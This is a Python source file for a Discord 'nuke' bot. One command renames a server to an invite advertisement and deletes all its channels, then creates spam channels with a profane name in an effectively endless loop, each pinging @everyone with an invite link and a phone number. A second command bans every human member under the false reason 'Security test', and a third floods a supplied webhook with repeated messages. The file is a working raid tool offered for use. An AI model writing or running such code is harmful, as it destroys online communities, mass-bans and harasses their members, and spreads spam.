import discord
from discord.ext import commands
import asyncio
import aiohttp

intents = discord.Intents.all()
bot = commands.Bot(command_prefix=",", intents=intents)

@bot.event
async def on_ready():
    print(f"Logged in as {bot.user}")

# ----------------------------------------------------------------------------
@bot.command()
async def x(ctx):
    guild = ctx.guild
    
    try:
        await guild.edit(name="discord.gg/aisypub aura")
    except:
        await ctx.send("error")
    
    try:
        await guild.edit(icon=None)
    except:
        await ctx.send("error")

    for channel in guild.channels:
        try:
            await channel.delete()
        except:
            pass
    
    for i in range(99999999999999999999999999):
        new_channel = await guild.create_text_channel(f"fucked-by-blck-{i}")
        await new_channel.send("@everyone discord.gg/aisypub - wz +54 92331402999")
        await asyncio.sleep(1)
    

# ----------------------------------------------------------------------------
@bot.command()
async def banall(ctx):
    guild = ctx.guild
    
    count = 0
    for member in guild.members:
        if not member.bot:
            try:
                await member.ban(reason="Security test")
                count += 1
                await asyncio.sleep(0.5)
            except:
                pass
    
    await ctx.send(f"banned {count} users.")

# ----------------------------------------------------------------------------
@bot.command()
async def whs(ctx, webhook_url: str, *, message: str):
    
    async with aiohttp.ClientSession() as session:
        for i in range(10):
            try:
                async with session.post(webhook_url, json={"content": message}) as resp:
                    pass
                await asyncio.sleep(0.5)
            except:
                pass
    
    await ctx.send("done")

bot.run("YOUR_BOT_TOKEN")
